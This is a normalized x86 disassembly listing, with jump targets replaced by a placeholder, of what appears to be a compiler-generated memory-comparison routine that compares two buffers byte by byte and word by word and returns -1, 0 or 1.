movzx edx [ esi ]
sub eax edx
je r-xdata
dec eax
je r-xdata
movzx eax [ ecx + 0x1 ]
movzx edx [ esi + 0x1 ]
sub eax edx
je r-xdata
xor edx edx
test eax eax
setg dl
lea edx [ edx + edx - 0x1 ]
mov eax edx
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
movzx eax [ ecx ]
movzx edx [ esi ]
sub eax edx
je r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
push ebx
push 0x20
pop edx
jmp r-xdata
movzx eax [ ecx + 0x2 ]
movzx ecx [ esi + 0x2 ]
jmp r-xdata
xor edx edx
test eax eax
setg dl
lea edx [ edx + edx - 0x1 ]
mov eax edx
test eax eax
jne r-xdata
movzx eax [ ecx + 0x1 ]
movzx edx [ esi + 0x1 ]
sub eax edx
je r-xdata
xor edx edx
test eax eax
setg dl
lea edx [ edx + edx - 0x1 ]
mov eax edx
test eax eax
jne r-xdata
cmp edi edx
jae r-xdata
movzx eax [ ecx + 0x2 ]
movzx edx [ esi + 0x2 ]
sub eax edx
je r-xdata
xor edx edx
test eax eax
setg dl
lea edx [ edx + edx - 0x1 ]
mov eax edx
test eax eax
jne r-xdata
mov esi [ eax ]
cmp esi [ ecx ]
je r-xdata
add eax edi
add ecx edi
cmp edi 0x1f
ja r-xdata
movzx eax [ ecx + 0x3 ]
movzx ecx [ esi + 0x3 ]
xor edx edx
test eax eax
setg dl
lea edx [ edx + edx - 0x1 ]
mov eax edx
test eax eax
jne r-xdata
xor esi esi
movzx esi [ eax ]
movzx ebx [ ecx ]
sub esi ebx
je r-xdata
xor eax eax
jmp [ edi * 4 + jump_table_4154c7 ]
mov eax esi
jmp r-xdata
mov esi [ eax + 0x4 ]
cmp esi [ ecx + 0x4 ]
je r-xdata
movzx esi [ eax + 0x1 ]
movzx ebx [ ecx + 0x1 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
mov edx [ eax - 0x1c ]
cmp edx [ ecx - 0x1c ]
je r-xdata
mov edx [ eax - 0x18 ]
cmp edx [ ecx - 0x18 ]
je r-xdata
mov edx [ eax - 0x14 ]
cmp edx [ ecx - 0x14 ]
je r-xdata
mov edx [ eax - 0x10 ]
cmp edx [ ecx - 0x10 ]
je r-xdata
mov edx [ eax - 0xc ]
cmp edx [ ecx - 0xc ]
je r-xdata
mov edx [ eax - 0x8 ]
cmp edx [ ecx - 0x8 ]
je r-xdata
mov edx [ eax - 0x4 ]
cmp edx [ ecx - 0x4 ]
je r-xdata
mov edx [ eax - 0x1d ]
cmp edx [ ecx - 0x1d ]
je r-xdata
mov edx [ eax - 0x19 ]
cmp edx [ ecx - 0x19 ]
je r-xdata
mov edx [ eax - 0x15 ]
cmp edx [ ecx - 0x15 ]
je r-xdata
mov edx [ eax - 0x11 ]
cmp edx [ ecx - 0x11 ]
je r-xdata
mov edx [ eax - 0xd ]
cmp edx [ ecx - 0xd ]
je r-xdata
mov edx [ eax - 0x9 ]
cmp edx [ ecx - 0x9 ]
je r-xdata
mov edx [ eax - 0x5 ]
cmp edx [ ecx - 0x5 ]
je r-xdata
movzx ecx [ ecx - 0x1 ]
movzx eax [ eax - 0x1 ]
sub eax ecx
je r-xdata
mov edx [ eax - 0x1e ]
cmp edx [ ecx - 0x1e ]
je r-xdata
mov edx [ eax - 0x1a ]
cmp edx [ ecx - 0x1a ]
je r-xdata
mov edx [ eax - 0x16 ]
cmp edx [ ecx - 0x16 ]
je r-xdata
mov edx [ eax - 0x12 ]
cmp edx [ ecx - 0x12 ]
je r-xdata
mov edx [ eax - 0xe ]
cmp edx [ ecx - 0xe ]
je r-xdata
mov edx [ eax - 0xa ]
cmp edx [ ecx - 0xa ]
je r-xdata
mov edx [ eax - 0x6 ]
cmp edx [ ecx - 0x6 ]
je r-xdata
mov dx [ eax - 0x2 ]
cmp dx [ ecx - 0x2 ]
je r-xdata
mov edx [ eax - 0x1f ]
cmp edx [ ecx - 0x1f ]
je r-xdata
mov edx [ eax - 0x1b ]
cmp edx [ ecx - 0x1b ]
je r-xdata
mov edx [ eax - 0x17 ]
cmp edx [ ecx - 0x17 ]
je r-xdata
mov edx [ eax - 0x13 ]
cmp edx [ ecx - 0x13 ]
je r-xdata
mov edx [ eax - 0xf ]
cmp edx [ ecx - 0xf ]
je r-xdata
mov edx [ eax - 0xb ]
cmp edx [ ecx - 0xb ]
je r-xdata
mov edx [ eax - 0x7 ]
cmp edx [ ecx - 0x7 ]
je r-xdata
movzx esi [ eax - 0x3 ]
movzx edx [ ecx - 0x3 ]
sub esi edx
je r-xdata
pop ebx
jmp r-xdata
xor esi esi
movzx esi [ eax + 0x4 ]
movzx ebx [ ecx + 0x4 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x2 ]
movzx ebx [ ecx + 0x2 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1c ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x18 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x14 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x10 ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0xc ]
movzx esi [ eax - 0xc ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x8 ]
sub esi edx
je r-xdata
xor eax eax
movzx esi dl
movzx edx [ ecx - 0x4 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1d ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x19 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x15 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x11 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0xd ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0x9 ]
movzx esi [ eax - 0x9 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x5 ]
sub esi edx
je r-xdata
xor ecx ecx
test eax eax
setg cl
lea ecx [ ecx + ecx - 0x1 ]
mov eax ecx
jmp r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1e ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1a ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x16 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x12 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0xe ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0xa ]
movzx esi [ eax - 0xa ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x6 ]
sub esi edx
je r-xdata
movzx edx [ ecx - 0x2 ]
movzx esi [ eax - 0x2 ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0x1f ]
movzx esi [ eax - 0x1f ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1b ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x17 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x13 ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0xf ]
movzx esi [ eax - 0xf ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0xb ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x7 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
je r-xdata
mov esi [ eax + 0x8 ]
cmp esi [ ecx + 0x8 ]
je r-xdata
movzx esi [ eax + 0x5 ]
movzx ebx [ ecx + 0x5 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax + 0x3 ]
movzx ebx [ ecx + 0x3 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax - 0x1b ]
movzx edx [ ecx - 0x1b ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x17 ]
movzx edx [ ecx - 0x17 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x13 ]
movzx edx [ ecx - 0x13 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xf ]
movzx edx [ ecx - 0xf ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xb ]
movzx edx [ ecx - 0xb ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x7 ]
movzx edx [ ecx - 0x7 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x3 ]
movzx edx [ ecx - 0x3 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
jne r-xdata
movzx esi [ eax - 0x1c ]
movzx edx [ ecx - 0x1c ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x18 ]
movzx edx [ ecx - 0x18 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x14 ]
movzx edx [ ecx - 0x14 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x10 ]
movzx edx [ ecx - 0x10 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xc ]
movzx edx [ ecx - 0xc ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x8 ]
movzx edx [ ecx - 0x8 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x4 ]
movzx edx [ ecx - 0x4 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x1d ]
movzx edx [ ecx - 0x1d ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x19 ]
movzx edx [ ecx - 0x19 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x15 ]
movzx edx [ ecx - 0x15 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x11 ]
movzx edx [ ecx - 0x11 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xd ]
movzx edx [ ecx - 0xd ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx edx [ ecx - 0x9 ]
movzx esi [ eax - 0x9 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x5 ]
movzx edx [ ecx - 0x5 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
jne r-xdata
movzx esi [ eax - 0x1e ]
movzx edx [ ecx - 0x1e ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x1a ]
movzx edx [ ecx - 0x1a ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x16 ]
movzx edx [ ecx - 0x16 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x12 ]
movzx edx [ ecx - 0x12 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xe ]
movzx edx [ ecx - 0xe ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xa ]
movzx edx [ ecx - 0xa ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x6 ]
movzx edx [ ecx - 0x6 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
mov eax edx
jmp r-xdata
xor esi esi
movzx esi [ eax + 0x8 ]
movzx ebx [ ecx + 0x8 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x6 ]
movzx ebx [ ecx + 0x6 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
jmp r-xdata
movzx esi [ eax - 0x1a ]
movzx edx [ ecx - 0x1a ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x16 ]
movzx edx [ ecx - 0x16 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x12 ]
movzx edx [ ecx - 0x12 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xe ]
movzx edx [ ecx - 0xe ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xa ]
movzx edx [ ecx - 0xa ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x6 ]
movzx edx [ ecx - 0x6 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x2 ]
movzx edx [ ecx - 0x2 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
jne r-xdata
mov eax edx
jmp r-xdata
movzx esi [ eax - 0x1b ]
movzx edx [ ecx - 0x1b ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x17 ]
movzx edx [ ecx - 0x17 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x13 ]
movzx edx [ ecx - 0x13 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xf ]
movzx edx [ ecx - 0xf ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xb ]
movzx edx [ ecx - 0xb ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x7 ]
movzx edx [ ecx - 0x7 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x3 ]
movzx edx [ ecx - 0x3 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x1c ]
movzx edx [ ecx - 0x1c ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x18 ]
movzx edx [ ecx - 0x18 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x14 ]
movzx edx [ ecx - 0x14 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x10 ]
movzx edx [ ecx - 0x10 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xc ]
movzx edx [ ecx - 0xc ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx edx [ ecx - 0x8 ]
movzx esi [ eax - 0x8 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x4 ]
movzx edx [ ecx - 0x4 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
jmp r-xdata
movzx esi [ eax - 0x1d ]
movzx edx [ ecx - 0x1d ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x19 ]
movzx edx [ ecx - 0x19 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x15 ]
movzx edx [ ecx - 0x15 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x11 ]
movzx edx [ ecx - 0x11 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xd ]
movzx edx [ ecx - 0xd ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x9 ]
movzx edx [ ecx - 0x9 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x5 ]
movzx edx [ ecx - 0x5 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
mov esi [ eax + 0xc ]
cmp esi [ ecx + 0xc ]
je r-xdata
movzx esi [ eax + 0x9 ]
movzx ebx [ ecx + 0x9 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax + 0x7 ]
movzx ebx [ ecx + 0x7 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax - 0x19 ]
movzx edx [ ecx - 0x19 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x15 ]
movzx edx [ ecx - 0x15 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x11 ]
movzx edx [ ecx - 0x11 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xd ]
movzx edx [ ecx - 0xd ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x9 ]
movzx edx [ ecx - 0x9 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x5 ]
movzx edx [ ecx - 0x5 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx eax [ eax - 0x1 ]
movzx ecx [ ecx - 0x1 ]
sub eax ecx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
je r-xdata
test eax eax
jne r-xdata
movzx esi [ eax - 0x1a ]
movzx edx [ ecx - 0x1a ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x16 ]
movzx edx [ ecx - 0x16 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x12 ]
movzx edx [ ecx - 0x12 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xe ]
movzx edx [ ecx - 0xe ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xa ]
movzx edx [ ecx - 0xa ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x6 ]
movzx edx [ ecx - 0x6 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x2 ]
movzx edx [ ecx - 0x2 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x1b ]
movzx edx [ ecx - 0x1b ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x17 ]
movzx edx [ ecx - 0x17 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x13 ]
movzx edx [ ecx - 0x13 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xf ]
movzx edx [ ecx - 0xf ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xb ]
movzx edx [ ecx - 0xb ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx edx [ ecx - 0x7 ]
movzx esi [ eax - 0x7 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x3 ]
movzx edx [ ecx - 0x3 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x1c ]
movzx edx [ ecx - 0x1c ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x18 ]
movzx edx [ ecx - 0x18 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x14 ]
movzx edx [ ecx - 0x14 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x10 ]
movzx edx [ ecx - 0x10 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xc ]
movzx edx [ ecx - 0xc ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x8 ]
movzx edx [ ecx - 0x8 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x4 ]
movzx edx [ ecx - 0x4 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
xor esi esi
movzx esi [ eax + 0xc ]
movzx ebx [ ecx + 0xc ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0xa ]
movzx ebx [ ecx + 0xa ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
xor ecx ecx
test eax eax
setg cl
lea ecx [ ecx + ecx - 0x1 ]
mov eax ecx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
